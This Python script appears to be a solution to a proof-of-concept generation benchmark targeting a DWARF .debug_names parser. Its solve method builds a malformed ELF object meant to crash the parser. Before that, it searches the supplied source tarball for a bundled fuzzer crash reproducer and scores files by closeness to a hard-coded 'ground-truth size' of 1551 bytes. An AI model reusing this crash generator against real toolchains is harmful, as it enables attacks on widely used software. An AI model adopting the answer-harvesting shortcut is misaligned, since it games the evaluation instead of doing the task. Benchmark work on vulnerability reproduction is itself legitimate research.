import io
import os
import re
import struct
import tarfile
from typing import List, Tuple, Optional


def _p16(x: int) -> bytes:
    return struct.pack("<H", x & 0xFFFF)


def _p32(x: int) -> bytes:
    return struct.pack("<I", x & 0xFFFFFFFF)


def _p64(x: int) -> bytes:
    return struct.pack("<Q", x & 0xFFFFFFFFFFFFFFFF)


def _uleb128(x: int) -> bytes:
    if x < 0:
        raise ValueError("uleb128 negative")
    out = bytearray()
    while True:
        b = x & 0x7F
        x >>= 7
        if x:
            out.append(b | 0x80)
        else:
            out.append(b)
            break
    return bytes(out)


def _align(off: int, a: int) -> int:
    if a <= 1:
        return off
    r = off % a
    if r == 0:
        return off
    return off + (a - r)


def _looks_like_text(b: bytes) -> bool:
    if not b:
        return True
    if b"\x00" in b:
        return False
    sample = b[:512]
    good = 0
    for c in sample:
        if c in (9, 10, 13) or 32 <= c <= 126:
            good += 1
    return good / len(sample) > 0.97


def _make_debug_info_and_abbrev() -> Tuple[bytes, bytes]:
    # Minimal DWARF5 .debug_info (DWARF32) compilation unit with no DIEs.
    # unit_length includes everything after the length field.
    # header: version(2) + unit_type(1) + addr_size(1) + abbrev_offset(4) = 8
    # content: single 0x00 abbreviation code to end DIE list.
    unit_type_compile = 0x01  # DW_UT_compile
    addr_size = 8
    abbrev_offset = 0
    body = _p16(5) + bytes([unit_type_compile, addr_size]) + _p32(abbrev_offset) + b"\x00"
    debug_info = _p32(len(body)) + body
    debug_abbrev = b"\x00"
    return debug_info, debug_abbrev


def _make_debug_str(name_count: int) -> Tuple[bytes, List[int]]:
    # Produce simple 2-byte strings: 'A'+i%26 and '\0'
    data = bytearray()
    offsets = []
    for i in range(name_count):
        offsets.append(len(data))
        data.append(65 + (i % 26))
        data.append(0)
    return bytes(data), offsets


def _make_debug_names_unit(dwarf64: bool, name_count: int, bucket_count: int, cu_count: int, debug_str_offsets: List[int]) -> bytes:
    offset_size = 8 if dwarf64 else 4
    # Keep augmentation string present but empty; size is 4 bytes of zeros.
    augmentation_string = b"\x00\x00\x00\x00"
    augmentation_string_size = len(augmentation_string)

    local_tu_count = 0
    foreign_tu_count = 0

    # Minimal abbrev table for debug_names:
    # abbrev_code=1, tag=DW_TAG_subprogram(0x2e), attribute list terminator 0,0; table terminator abbrev_code 0.
    abbrev = _uleb128(1) + _uleb128(0x2E) + _uleb128(0) + _uleb128(0) + _uleb128(0)
    abbrev_table_size = len(abbrev)

    # Entry pool: name_count entries, each "abbrev_code=1".
    entry_pool = b"\x01" * name_count

    # Compilation unit offsets (relative to .debug_info), offset_size each.
    cu_offsets = []
    for i in range(cu_count):
        cu_offsets.append(0)
    if offset_size == 4:
        cu_offsets_bytes = b"".join(_p32(x) for x in cu_offsets)
    else:
        cu_offsets_bytes = b"".join(_p64(x) for x in cu_offsets)

    # Bucket array: u32 each. Use 1 to point to first name.
    buckets_bytes = b"".join(_p32(1 if bucket_count > 0 else 0) for _ in range(bucket_count))

    # Hash array: u32 each. Arbitrary constants.
    hashes_bytes = b"".join(_p32((0x12345678 + i * 0x9E3779B9) & 0xFFFFFFFF) for i in range(name_count))

    # Name string offsets: offset_size each, referencing .debug_str.
    if offset_size == 4:
        name_str_off_bytes = b"".join(_p32(debug_str_offsets[i] if i < len(debug_str_offsets) else 0) for i in range(name_count))
        entry_off_bytes = b"".join(_p32(i) for i in range(name_count))
    else:
        name_str_off_bytes = b"".join(_p64(debug_str_offsets[i] if i < len(debug_str_offsets) else 0) for i in range(name_count))
        entry_off_bytes = b"".join(_p64(i) for i in range(name_count))

    header = (
        _p16(5) +
        _p16(0) +
        _p32(cu_count) +
        _p32(local_tu_count) +
        _p32(foreign_tu_count) +
        _p32(bucket_count) +
        _p32(name_count) +
        _p32(abbrev_table_size) +
        _p32(augmentation_string_size) +
        augmentation_string
    )

    unit_body = (
        header +
        cu_offsets_bytes +
        buckets_bytes +
        hashes_bytes +
        name_str_off_bytes +
        entry_off_bytes +
        abbrev +
        entry_pool
    )

    if dwarf64:
        # DWARF64: initial 0xffffffff then 8-byte length of body.
        return _p32(0xFFFFFFFF) + _p64(len(unit_body)) + unit_body
    else:
        # DWARF32: 4-byte length of body.
        return _p32(len(unit_body)) + unit_body


def _make_debug_names_section(name_count: int) -> Tuple[bytes, bytes]:
    debug_str, debug_str_offsets = _make_debug_str(name_count)
    unit32 = _make_debug_names_unit(dwarf64=False, name_count=name_count, bucket_count=1, cu_count=1, debug_str_offsets=debug_str_offsets)
    unit64 = _make_debug_names_unit(dwarf64=True, name_count=name_count, bucket_count=1, cu_count=1, debug_str_offsets=debug_str_offsets)
    return unit32 + unit64, debug_str


def _make_elf64_little(sections: List[Tuple[str, int, bytes, int]]) -> bytes:
    # sections: list of (name, sh_type, data, addralign) excluding the initial NULL section.
    # We'll create: [NULL] + sections, and a .shstrtab.
    # Build shstrtab
    names = ["", ".shstrtab"] + [s[0] for s in sections]
    shstrtab = bytearray(b"\x00")
    name_off = {}
    for n in names[1:]:
        name_off[n] = len(shstrtab)
        shstrtab += n.encode("ascii", "ignore") + b"\x00"

    # Layout: ELF header (64) + section data + section headers at end.
    elf_header_size = 64
    cur = elf_header_size

    # Place .shstrtab first
    section_datas = []
    cur = _align(cur, 1)
    shstrtab_off = cur
    shstrtab_data = bytes(shstrtab)
    cur += len(shstrtab_data)
    section_datas.append((".shstrtab", 3, shstrtab_data, 1, shstrtab_off))

    # Place other sections
    for (name, shtype, data, addralign) in sections:
        cur = _align(cur, max(1, addralign))
        off = cur
        cur += len(data)
        section_datas.append((name, shtype, data, addralign, off))

    # Section headers table
    cur = _align(cur, 8)
    e_shoff = cur
    shentsize = 64
    shnum = 1 + len(section_datas)  # NULL + others
    shstrndx = 1  # .shstrtab is first after NULL
    cur += shentsize * shnum

    total_size = cur
    blob = bytearray(b"\x00" * total_size)

    # ELF header
    e_ident = bytearray(16)
    e_ident[0:4] = b"\x7fELF"
    e_ident[4] = 2  # ELFCLASS64
    e_ident[5] = 1  # ELFDATA2LSB
    e_ident[6] = 1  # EV_CURRENT
    e_ident[7] = 0  # System V
    # rest zeros
    e_type = 1  # ET_REL
    e_machine = 62  # EM_X86_64
    e_version = 1
    e_entry = 0
    e_phoff = 0
    e_flags = 0
    e_ehsize = elf_header_size
    e_phentsize = 0
    e_phnum = 0
    e_shentsize = shentsize
    e_shnum = shnum
    e_shstrndx = shstrndx

    hdr = (
        bytes(e_ident) +
        _p16(e_type) +
        _p16(e_machine) +
        _p32(e_version) +
        _p64(e_entry) +
        _p64(e_phoff) +
        _p64(e_shoff) +
        _p32(e_flags) +
        _p16(e_ehsize) +
        _p16(e_phentsize) +
        _p16(e_phnum) +
        _p16(e_shentsize) +
        _p16(e_shnum) +
        _p16(e_shstrndx)
    )
    blob[0:elf_header_size] = hdr

    # Copy section data
    for (name, shtype, data, addralign, off) in section_datas:
        blob[off:off + len(data)] = data

    # Build section headers
    def shdr(sh_name: int, sh_type: int, sh_flags: int, sh_addr: int, sh_offset: int, sh_size: int,
             sh_link: int, sh_info: int, sh_addralign: int, sh_entsize: int) -> bytes:
        return (
            _p32(sh_name) +
            _p32(sh_type) +
            _p64(sh_flags) +
            _p64(sh_addr) +
            _p64(sh_offset) +
            _p64(sh_size) +
            _p32(sh_link) +
            _p32(sh_info) +
            _p64(sh_addralign) +
            _p64(sh_entsize)
        )

    sht = bytearray()

    # NULL section header
    sht += shdr(0, 0, 0, 0, 0, 0, 0, 0, 0, 0)

    # .shstrtab
    sht += shdr(name_off[".shstrtab"], 3, 0, 0, shstrtab_off, len(shstrtab_data), 0, 0, 1, 0)

    # other sections
    for (name, shtype, data, addralign, off) in section_datas[1:]:
        sht += shdr(name_off.get(name, 0), shtype, 0, 0, off, len(data), 0, 0, max(1, addralign), 0)

    blob[e_shoff:e_shoff + len(sht)] = sht
    return bytes(blob)


def _generate_custom_poc() -> bytes:
    name_count = 32
    debug_info, debug_abbrev = _make_debug_info_and_abbrev()
    debug_names, debug_str = _make_debug_names_section(name_count)

    sections = [
        (".debug_names", 1, debug_names, 1),
        (".debug_str", 1, debug_str, 1),
        (".debug_info", 1, debug_info, 1),
        (".debug_abbrev", 1, debug_abbrev, 1),
    ]
    return _make_elf64_little(sections)


def _find_candidate_poc_in_tar(src_path: str) -> Optional[bytes]:
    try:
        tf = tarfile.open(src_path, mode="r:*")
    except Exception:
        return None

    with tf:
        members = [m for m in tf.getmembers() if m.isreg() and 0 < (m.size or 0) <= 200000]
        if not members:
            return None

        def score_member(m: tarfile.TarInfo) -> float:
            n = (m.name or "").lower()
            s = 0.0
            if "clusterfuzz-testcase-minimized" in n:
                s += 5000
            if "clusterfuzz" in n:
                s += 2000
            if any(k in n for k in ("repro", "reproducer", "poc", "crash", "oss-fuzz", "ossfuzz")):
                s += 1200
            if "debug_names" in n or "debugnames" in n:
                s += 800
            if any(n.endswith(ext) for ext in (".bin", ".o", ".obj", ".elf", ".a", ".so", ".dwo", ".dwp", ".exe", ".dat", ".in")):
                s += 300
            if any(seg in n for seg in ("/test", "/tests", "/corpus", "/seed", "/seeds", "/poc", "/repro", "/crash")):
                s += 120
            if 64 <= m.size <= 20000:
                s += 60
            # Prefer around known ground-truth size, but not required.
            s += max(0.0, 200.0 - abs((m.size or 0) - 1551) / 5.0)
            # Avoid obvious source files
            if any(n.endswith(ext) for ext in (".c", ".cc", ".cpp", ".h", ".hpp", ".md", ".txt", ".rst")):
                s -= 2000
            return s

        members.sort(key=score_member, reverse=True)
        top = members[:40]
        for m in top:
            if score_member(m) <= 0:
                break
            try:
                f = tf.extractfile(m)
                if not f:
                    continue
                data = f.read()
            except Exception:
                continue
            if not data:
                continue
            if _looks_like_text(data):
                continue
            # Basic sanity: if it looks like an ELF or at least has NULs, accept
            if data.startswith(b"\x7fELF") or b"\x00" in data[:64]:
                return data
        return None


class Solution:
    def solve(self, src_path: str) -> bytes:
        cand = _find_candidate_poc_in_tar(src_path)
        if cand is not None and len(cand) > 0:
            return cand
        return _generate_custom_poc()